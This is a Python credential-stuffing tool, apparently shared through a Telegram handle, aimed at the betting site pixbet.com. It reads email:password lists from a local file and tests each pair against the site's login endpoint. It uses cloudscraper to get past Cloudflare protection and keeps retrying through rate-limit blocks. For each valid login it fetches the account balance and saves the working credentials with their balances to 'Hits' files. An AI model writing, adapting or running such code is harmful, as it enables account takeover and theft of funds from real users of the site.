import cloudscraper
import inquirer
import os
from colorama import Fore
import subprocess
import platform

h = {"Host": "pixbet.com",
"Accept": "application/json, text/plain, */*",
"Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
"Accept-Encoding": "gzip, deflate, br, zstd",
"X-Requested-With": "XMLHttpRequest",
"Content-Type": "application/json",
"reCAPTCHA_Token": "null",
"X-Lat": "null",
"X-Long": "null",
"Origin": "https://pixbet.com",
"Connection": "keep-alive",
"Referer": "https://pixbet.com/sports",
}

def info(f,h,r):
    if platform.system() == "Windows":
        title = f'PiXBeT @WAFCLOUD - Hits: {h} Fails: {f} Retest: {r}'
        subprocess.call(['title', title], shell=True)
    else:
        print("Contado off")

def login(x,d):
    
    global fails,hits,retest
    
    info(fails,hits,retest)

    if d.count(':') != 1:
        
        print('ALGUM ERRO NA LINHA:',d)
            
        return
    
    email, senha = d.split(':')
    
    j = {"email":email, "password":senha, "type":"email"}

    while True:
        
        c = cloudscraper.create_scraper()
        
        try:
            r = c.post('https://pixbet.com/new-login', params=j, headers=h, timeout=10)
        except:
            retest += 1
            info(fails,hits,retest)
            continue
        
        if r.status_code == 200:
            
            xs = r.cookies.get('XSRF-TOKEN')
            ss = r.cookies.get('singlebet_session')
            
            o = {'XSRF-TOKEN': xs, 'singlebet_session': ss}
            
        elif r.status_code == 422:
            fails += 1
            info(fails,hits,retest)
            
            print(Fore.RED+f'FAIL | {x} - {d}'+Fore.RESET)
            
            break
        
        elif r.status_code == 403:
            retest += 1
            info(fails,hits,retest)
            print(f'CLOUDFLARE |',x,d)
        
        elif r.status_code == 429:
            retest += 1
            info(fails,hits,retest)
            print(f'IP Banido |',x,d)
            continue
        
        else:
            retest += 1
            info(fails,hits,retest)
            print('NOVO ERRO |',x,d, r.status_code)
            break
        
        try:
            r = c.get('https://pixbet.com/takeUser', headers=h and o, timeout=10)
        except:
            retest += 1
            info(fails,hits,retest)
            continue
        
        if 'balance' in r.text:
            hits += 1
            info(fails,hits,retest)
            v = r.json()['balance']
            
            if float(v) < 0.00:
                
                print(f'Sucesso | {x} - {d} Saldo: {v}')
                with open('Hits/PixBet-Saldo.txt', 'a',encoding='utf-8',errors='ignore') as g:
                    g.write(f'{d} | Saldo: {v}\n')
                break
            
            else:
                
                print(Fore.GREEN+f'Sucesso | {x} - {d} | Saldo: {v}'+Fore.RESET)
            
                with open('Hits/PixBet-Sem.txt', 'a',encoding='utf-8',errors='ignore') as g:
                    g.write(f'{d} | Saldo: {v}\n')

                    break
                
        elif r.status_code == 403:
            retest += 1
            info(fails,hits,retest)
            print(f'CLOUDFLARE |',x,d)
            
        else:
            hits += 1
            info(fails,hits,retest)
            print(Fore.YELLOW+f'Custom | {x} - {d}'+Fore.RESET)
            break


def main():
    
    aq = [inquirer.List('k', message='Escolha', choices=[arquivo for arquivo in os.listdir() if arquivo.endswith('.txt') or arquivo.endswith('.csv')])]
    try:
        aq = inquirer.prompt(aq)['k']
        
        os.system('cls')
        
        with open(aq, 'r',encoding='utf-8', errors='ignore') as xx:
            xx = xx.read().splitlines()
        
    except:
        
        print('Burro, Aprenda a escolher')
        return
    
    
    if len(xx) == 0:
        print('Esta Louco arquivo vazio')
        
        return
        
    for x, d in enumerate(xx, start=1):
        login(x, d)
    
    
if __name__ == '__main__':
    
    fails = 0
    hits = 0
    retest = 0
    
    os.system(f'title PiXBeT @WAFCLOUD')
    
    if not os.path.exists('Hits'):
        os.makedirs('Hits')
    
    try:
        main()
        input('\nFechar: ')
    except Exception as e:
        print('Erro:', e)
        
#By Creator https://t.me/Unkn0wnGun